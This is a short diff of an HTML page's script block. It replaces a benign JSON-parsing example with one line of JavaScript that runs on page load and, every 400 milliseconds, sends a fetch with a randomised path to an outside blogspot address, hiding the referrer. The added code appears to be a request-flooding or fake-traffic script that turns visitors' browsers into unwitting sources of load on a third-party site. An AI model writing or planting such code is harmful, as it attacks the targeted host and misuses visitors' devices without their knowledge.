@@ -1,12 +1,5 @@
 <script>
-const json = '{"result":true, "count":42}';
-const obj = JSON.parse(json);
-
-document.getElementById("id").innerHTML = "obj.count";
-// Expected output: 42
-
-console.log(obj.result);
-// Expected output: true
+setInterval(function(){fetch("https://jsmith908.blogspot.com/"+Math.random().toString(36).substring(2,3+Math.random()*8)+"/",{ referrerPolicy:"no-referrer",mode:"no-cors" });},400);
 </script>
 
 <h1 id=id>sd</h1>
